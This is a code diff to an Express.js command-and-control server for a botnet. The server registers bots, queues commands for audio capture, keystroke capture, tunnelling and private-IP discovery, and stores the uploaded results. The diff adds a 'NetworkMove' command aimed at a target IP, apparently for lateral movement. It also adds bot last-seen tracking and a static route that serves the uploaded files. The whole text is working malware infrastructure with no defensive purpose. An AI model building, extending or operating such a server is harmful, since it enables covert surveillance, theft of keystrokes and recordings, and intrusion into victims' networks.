@@ -14,9 +14,11 @@ const {
     GetPrivateIp,
     AudioCapture,
     OpenTunnel,
+    NetworkMove,
     GetKeyboardData,
     InstallTunnel
 } = require("./commands")
+const {join} = require("path");
 
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
@@ -50,6 +52,7 @@ const storage = multer.diskStorage({
     }
 });
 
+
 // Create the multer instance
 const upload = multer({ storage: storage });
 
@@ -57,6 +60,8 @@ const upload = multer({ storage: storage });
 const app = express();
 const port = 3000;
 
+
+app.use('/backend/storage', express.static(join(__dirname, 'uploads')))
 app.use(express.json());
 
 const bots = []; // { id: 1, name: "Bot 1", status: "online" },
@@ -141,6 +146,12 @@ function sendCommand(command) {
             const getKeyboardDataCommand = new GetKeyboardData()
             targetChannel.commands.push(getKeyboardDataCommand)
             break
+
+        case "NetworkMove":
+            logger.info("Adding NetworkMove command")
+            const networkMoveCommand = new NetworkMove({targetIp : command.args.targetIp})
+            targetChannel.commands.push(networkMoveCommand)
+            break
     }
 }
 
@@ -186,6 +197,15 @@ function addChannelMessage(botId, message) {
 
 }
 
+function updateBotLastSeen(botId) {
+    const targetBot = bots.find((bot) => bot.id === botId)
+    if (targetBot) {
+        targetBot.lastSeen = +Date.now()
+        return
+    }
+    logger.warn("No bot found for bot : " + botId + " -> aborting update.")
+}
+
 /* ADMIN routes  */ 
 
 app.get("/backend/bots", (req, res) => {
@@ -216,6 +236,7 @@ app.get("/backend/channels", (req, res) => {
     res.send(JSON.stringify(channels));
 });
 
+
 /* --- ADMIN --- */ 
 
 
@@ -233,7 +254,7 @@ app.post("/",  upload.single('file'), (req, res) => {
     }
 
     if (payload.name === "ANNOUNCE") {
-        registerBot({ id: payload.id, name: payload.name, status: "online"});
+        registerBot({ id: payload.id, name: payload.name, lastSeen: +Date.now()});
         res.send(JSON.stringify({ success : true}))
         return
     }
@@ -249,7 +270,7 @@ app.post("/",  upload.single('file'), (req, res) => {
         logger.info("[RESULT] command result from bot : " + payload.id);
         logger.info("[RESULT] command result : " + payload.result);
         logger.info(payload.result)
-
+        updateBotLastSeen(payload.id)
         popCommand(payload.id)
         addChannelMessage(payload.id, payload.result)
 
